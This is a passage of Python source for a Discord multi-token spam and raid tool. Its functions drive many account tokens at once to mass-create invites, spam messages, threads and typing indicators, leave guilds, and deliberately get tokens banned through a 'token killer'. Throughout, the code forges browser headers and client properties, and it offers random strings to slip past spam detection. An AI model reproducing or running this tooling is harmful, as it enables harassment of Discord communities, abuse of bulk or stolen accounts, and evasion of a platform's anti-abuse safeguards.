            input("\n> ")
            return
        
        channels = guild_response.json()
        invite_channels = [ch for ch in channels if ch.get('type') in [0, 5] and ch.get('name')] 
        
        if not invite_channels:
            console_logger("No suitable channels found for invite creation", "error")
            input("\n> ")
            return
        
        console_logger(f"Found {len(invite_channels)} channels available for invite creation", "info")
        
    except Exception as e:
        console_logger(f"Error getting guild info: {str(e)}", "error")
        input("\n> ")
        return
    
    for i, token in enumerate(tokens, 1):
        masked_token = mask_token(token)
        console_logger(f"[{i}/{len(tokens)}] Processing {masked_token}...", "info")
        
        user_agent = random.choice(user_agents)
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": user_agent,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Origin": "https://discord.com",
            "Referer": f"https://discord.com/channels/{waudjisodwad}",
            "Sec-CH-UA": '"Google Chrome";v="131", "Not;A=Brand";v="99"',
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "X-Discord-Locale": "en-US",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZSwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTMxLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjQzNTM5NiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }
        
        token_invites_created = 0
        token_failed = 0
        
        for invite_num in range(invite_count):
            try:
                channel = random.choice(invite_channels)
                channel_id = channel['id']
                channel_name = channel['name']

                invite_payload = {
                    "max_age": 0,     
                    "max_uses": 0,     
                    "temporary": False,
                    "unique": True
                }
                
                invite_response = requests.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/invites",
                    headers=headers,
                    json=invite_payload,
                    timeout=30
                )
                
                if invite_response.status_code == 200:
                    invite_data = invite_response.json()
                    invite_code = invite_data.get('code', 'unknown')
                    console_logger(f"{masked_token} - Invite created: discord.gg/{invite_code} in #{channel_name}", "success")
                    token_invites_created += 1
                    total_invites_created += 1
                elif invite_response.status_code == 401:
                    console_logger(f"{masked_token} - Invalid token (401)", "error")
                    token_failed += 1
                    break  
                elif invite_response.status_code == 403:
                    console_logger(f"{masked_token} - No permission to create invites (403)", "error")
                    token_failed += 1
                    break  
                elif invite_response.status_code == 404:
                    console_logger(f"{masked_token} - Channel not found (404)", "error")
                    token_failed += 1
                elif invite_response.status_code == 429:
                    retry_after = invite_response.headers.get('Retry-After', '5')
                    console_logger(f"{masked_token} - Rate limited! Waiting {retry_after}s...", "warning")
                    time.sleep(int(retry_after) + random.uniform(1, 3))
                    token_failed += 1
                else:
                    console_logger(f"{masked_token} - Failed to create invite: {invite_response.status_code}", "error")
                    token_failed += 1

                time.sleep(random.uniform(0.5, 2.0))
                
            except Exception as e:
                console_logger(f"{masked_token} - Invite creation error: {str(e)}", "error")
                token_failed += 1
        
        if token_invites_created > 0:
            success_count += 1
            console_logger(f"{masked_token} - Created {token_invites_created}/{invite_count} invites", "success")
        else:
            failed_count += 1
            console_logger(f"{masked_token} - Failed to create any invites", "error")
        
        time.sleep(random.uniform(2.0, 4.0))
    
    input(f"> ")

def handle_leave_guild():
    clear_console()
    print(dopasdkw)
    
    guild_id = input("Guild ID > ").strip()
    
    if not guild_id.isdigit():
        console_logger("Invalid Guild ID. Please enter a numeric Discord guild ID", "error")
        input("\n> ")
        return
    
    leave_guild_multi(guild_id)
    
    time.sleep(1)  

def handle_token_killer():
    clear_console()
    print(dopasdkw)
    
    console_logger("Token Killer - Rapidly spam settings changes to trigger Discord anti-spam", "warning")
    console_logger("This will attempt to get tokens banned/restricted by Discord's automated systems", "warning")
    console_logger("WARNING: This is destructive and will likely disable the tokens permanently!", "error")
    
    leave_guilds_choice = input("\nDo you also want to leave ALL guilds while killing tokens? (y/n): ").strip().lower()
    
    leave_all_guilds = False
    if leave_guilds_choice in ['y', 'yes']:
        leave_all_guilds = True
    
    close_dms = True
    remove_friends = True
    
    token_killer_multi(leave_all_guilds, close_dms, remove_friends)


def handle_message_spammer():
    clear_console()
    print(dopasdkw)
    
    global spam_active
    
    if spam_active:
        console_logger("Do you want to:", "info")
        console_logger("1. Stop current spam", "info")
        console_logger("2. Keep running and go back", "info")
        
        choice = input("Choice (1 or 2) > ").strip()
        
        if choice == "1":
            stop_message_spam()
        else:
            console_logger("Keeping spam running", "info")
        
        input("\n> ")
        return
    
    channel_id = input("Channel ID > ").strip()
    
    if not channel_id.isdigit():
        console_logger("Invalid channel ID. Please enter a numeric Discord channel ID", "error")
        input("\n> ")
        return
    
    clear_console()
    print(dopasdkw)
    message = input("Message to spam > ").strip()
    
    if not message:
        console_logger("Message cannot be empty", "error")
        input("\n> ")
        return
    
    clear_console()
    print(dopasdkw)
    if "{random}" not in message:
        add_random = input("Add random string to avoid spam detection? (y/n) > ").strip().lower()
        if add_random in ['y', 'yes']:
            message += " {random}"
    
    try:
        clear_console()
        print(dopasdkw)
        delay_input = input("Delay between messages in seconds (default 1-3) > ").strip()
        if delay_input:
            if '-' in delay_input:
                delay_parts = delay_input.split('-')
                delay_min = float(delay_parts[0])
                delay_max = float(delay_parts[1])
            else:
                delay_min = delay_max = float(delay_input)
        else:
            delay_min, delay_max = 1.0, 3.0
    except ValueError:
        console_logger("Invalid delay format. Using default 1-3 seconds", "warning")
        delay_min, delay_max = 1.0, 3.0
    
    if delay_min < 0.5:
        console_logger("Minimum delay set to 0.5 seconds to avoid rate limits", "warning")
        delay_min = 0.5
    
    if delay_max < delay_min:
        delay_max = delay_min
    
    success = message_spammer_multi(channel_id, message, delay_min, delay_max)
    
    if success:
        console_logger("Message spam started successfully!", "success")
    input("\n> ")


# Fake Typing
def fake_typing_multi(channel_id):
    global typing_threads, typing_active
    
    tokens = load_tokens_from_file()
    if not tokens:
        console_logger("No tokens found", "error")
        return False

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    ]

    def generate_super_properties():
        os_versions = ["10", "11"]
        browser_versions = ["142.0", "131.0.0.0", "130.0.0.0"]
        build_numbers = [438971, 438500, 438000, 437500]
        
        super_props = {
            "os": "Windows",
            "browser": random.choice(["Firefox", "Chrome"]),
            "device": "",
            "system_locale": "en-US",
            "has_client_mods": False,
            "browser_user_agent": random.choice(user_agents),
            "browser_version": random.choice(browser_versions),
            "os_version": random.choice(os_versions),
            "referrer": "",
            "referring_domain": "",
            "referrer_current": "",
            "referring_domain_current": "",
            "release_channel": "stable",
            "client_build_number": random.choice(build_numbers),
            "client_event_source": None,
            "client_launch_id": f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}",
            "launch_signature": f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}",
            "client_app_state": "focused",
            "client_heartbeat_session_id": f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
        }
        return base64.b64encode(json.dumps(super_props, separators=(',', ':')).encode()).decode()

    def typing_worker(token):
        masked_token = mask_token(token)
        
        url = f"https://discord.com/api/v9/channels/{channel_id}/typing"
        user_agent = random.choice(user_agents)
        
        while typing_active:
            try:
                super_properties = generate_super_properties()
                
                headers = {
                    "Authorization": token,
                    "User-Agent": user_agent,
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Origin": "https://discord.com",
                    "Referer": f"https://discord.com/channels/@me/{channel_id}",
                    "Sec-CH-UA": '"Not;A=Brand";v="99", "Google Chrome";v="131", "Chromium";v="131"',
                    "Sec-CH-UA-Mobile": "?0",
                    "Sec-CH-UA-Platform": '"Windows"',
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "X-Super-Properties": super_properties,
                    "X-Discord-Locale": "en-US",
                    "X-Discord-Timezone": "America/New_York",
                    "X-Debug-Options": "bugReporterEnabled",
                    "DNT": "1",
                    "Connection": "keep-alive",
                    "Content-Length": "0"
                }
                
                session = requests.Session()
                session.headers.update(headers)
                
                response = session.post(url, timeout=15)
                
                if response.status_code == 204:
                    pass  # Success, continue typing
                elif response.status_code == 401:
                    break  # Invalid token, stop this worker
                elif response.status_code == 403:
                    break  # No permission, stop this worker
                elif response.status_code == 404:
                    break  # Channel not found, stop this worker
                elif response.status_code == 429:
                    retry_after = response.headers.get('Retry-After', '10')
                    time.sleep(int(retry_after) + random.uniform(1, 3))
                    continue
                    
                session.close()
                
                if typing_active:
                    time.sleep(random.uniform(8.0, 10.0))
                    
            except Exception:
                if typing_active:
                    time.sleep(random.uniform(5.0, 10.0))

    stop_fake_typing()
    
    typing_active = True
    typing_threads = []
    
    for token in tokens:
        thread = threading.Thread(target=typing_worker, args=(token,), daemon=True)
        typing_threads.append(thread)
        thread.start()
        time.sleep(random.uniform(0.1, 0.5))
    return True

def stop_fake_typing():
    global typing_active, typing_threads
    
    if typing_active:
        typing_active = False
        
        for thread in typing_threads:
            if thread.is_alive():
                thread.join(timeout=1)
        
        typing_threads = []
        console_logger("Fake typing stopped!", "warning")
        return True
    else:
        return False

def handle_faketyping():
    clear_console()
    print(dopasdkw)

    channel_id = input("Channel ID > ").strip()

    if not channel_id.isdigit():
        console_logger("Invalid channel ID. Please enter a numeric Discord channel ID", "error")
        input("\n> ")
        return

    fake_typing_multi(channel_id)

    input("\n> ")


def handle_threadcreatespammer():
    clear_console()
    print(dopasdkw)

    channel_id = input("Channel ID > ").strip()

    if not channel_id.isdigit():
        console_logger("Invalid channel ID. Please enter a numeric Discord channel ID", "error")
        input("\n> ")
        return

    thread_name = input("Thread name (base) > ").strip()
    
    if not thread_name:
        console_logger("Thread name cannot be empty", "error")
        input("\n> ")
        return

    try:
        thread_count = int(input("Number of threads to create (default 50) > ").strip() or "50")
        if thread_count <= 0:
            thread_count = 50
        elif thread_count > 200:
            console_logger("Maximum 200 threads allowed", "warning")
            thread_count = 200
    except:
        thread_count = 50

    console_logger(f"Starting thread spam: {thread_count} threads in channel {channel_id}...", "info")
    success = thread_spammer_multi(channel_id, thread_name, thread_count)
    
    if success:
        console_logger("Thread spam completed!", "success")
    
    input("\n> ")   

# End

def Main():
    resize_console(130, 40)
    clear_console()
    print(MAINBANNER)
    
    choice = input("> ")
    
    if choice == "1":
        handle_server_joiner()
        Main()
    elif choice == "3":
        handle_message_spammer()
        Main()
    elif choice == "2":
        handle_leave_guild()
        Main()
    elif choice == "4":
        handle_token_checker()
        Main()
    elif choice == "7":
        handle_token_killer()
        Main()
    elif choice == "8":
        handle_bio_changer()
        Main()
    elif choice == "9":
        handle_Join_VoiceChannel()
        Main()
    elif choice == "10":
        handle_nickname_changer()
        Main()
    elif choice == "5":
        handle_soundboard_spam()
        Main()
    elif choice == "16":
        handle_disconnect_voice()
        Main()
    elif choice == "14":
        handle_call_spammer()
        Main()
    elif choice == "13":
        handle_faketyping()
        Main()
    elif choice == "11":
        handle_threadcreatespammer()
        Main()
    elif choice == "15":
        handle_invite_spam()
        Main()
    elif choice == "12":
        handle_friend_adder()
        Main()
    else:
        console_logger("What are you dumbass?", "warning")
        input("? ")
        Main()

def MAINLOADER():
    print(dopasdkw)

    loader = DotLoader()
    loader.start()
    initialize_rpc()
    time.sleep(2)
    loader.stop()
    
    winsound_beep()
    
    Main()

# # # #


if __name__ == "__main__":
    setup_cleanup()
    
    resize_console(100, 30)
    clear_console()
    rename_console()

    MAINLOADER()
